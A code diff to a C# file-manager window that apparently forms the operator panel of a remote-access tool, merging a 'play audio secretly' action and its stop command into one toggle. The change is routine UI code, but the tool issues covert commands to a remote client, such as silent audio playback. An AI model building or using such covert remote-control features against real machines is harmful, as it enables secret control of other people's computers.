@@ -135,8 +135,7 @@ public partial class FileManagerWindow : ThemedWindow
         if (MnuFmSetAttr     != null) MnuFmSetAttr.Header     = Lang.Get("FM_SET_ATTR");
         if (MnuFmWallpaper   != null) MnuFmWallpaper.Header   = Lang.Get("FM_WALLPAPER");
         if (MnuFmPlayMusic       != null) MnuFmPlayMusic.Header       = Lang.Get("FM_PLAY_MUSIC");
-        if (MnuFmPlayMusicSecret != null) MnuFmPlayMusicSecret.Header = Lang.Get("FM_PLAY_MUSIC_SECRET");
-        if (MnuFmStopAudio       != null) MnuFmStopAudio.Header       = Lang.Get("FM_STOP_AUDIO");
+        if (MnuFmPlayMusicSecret != null) MnuFmPlayMusicSecret.Header = Lang.Get(_isPlayingAudio ? "FM_STOP_AUDIO" : "FM_PLAY_MUSIC_SECRET");
         if (MnuFmZip             != null) MnuFmZip.Header             = Lang.Get("FM_ZIP");
         if (MnuFmDownloadUrl != null) MnuFmDownloadUrl.Header = Lang.Get("FM_DOWNLOAD_URL");
         if (MnuFmCopyName    != null) MnuFmCopyName.Header    = Lang.Get("ACT_COPY_NAME");
@@ -766,6 +765,22 @@ public partial class FileManagerWindow : ThemedWindow
 
     private async void PlayMusicSecret_Click(object s, RoutedEventArgs e)
     {
+        if (_isPlayingAudio)
+        {
+            try
+            {
+                await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmPlayAudioStop });
+                _isPlayingAudio = false;
+                MnuFmPlayMusicSecret.Header = Lang.Get("FM_PLAY_MUSIC_SECRET");
+                TxtStatus.Text = Lang.Get("FM_AUDIO_STOPPED");
+            }
+            catch (Exception ex)
+            {
+                TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            }
+            return;
+        }
+
         if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
         var path = Path.Combine(_currentPath, row.Name);
 
@@ -779,6 +794,8 @@ public partial class FileManagerWindow : ThemedWindow
                 Type = PacketType.FmPlayAudio,
                 Data = JsonConvert.SerializeObject(new FmPlayAudioData { Path = path })
             });
+            _isPlayingAudio = true;
+            MnuFmPlayMusicSecret.Header = Lang.Get("FM_STOP_AUDIO");
             TxtStatus.Text = string.Format(Lang.Get("FM_PLAYING_SILENT"), row.Name);
             ServerWindow.ReportGlobalActivity("Play audio secretly", row.Name, "complete");
         }
@@ -786,19 +803,6 @@ public partial class FileManagerWindow : ThemedWindow
         {
             TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
             ServerWindow.ReportGlobalActivity("Play audio secretly", row.Name, "failed");
-        }
-    }
-
-    private async void StopAudio_Click(object s, RoutedEventArgs e)
-    {
-        try
-        {
-            await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmPlayAudioStop });
-            TxtStatus.Text = Lang.Get("FM_AUDIO_STOPPED");
-        }
-        catch (Exception ex)
-        {
-            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
         }
     }
 
@@ -1001,6 +1005,7 @@ public partial class FileManagerWindow : ThemedWindow
 
     private string? _previewTempFile;
     private bool _videoPlaying;
+    private bool _isPlayingAudio;
 
     private void GridFiles_SelectionChanged(object s, System.Windows.Controls.SelectionChangedEventArgs e)
     {
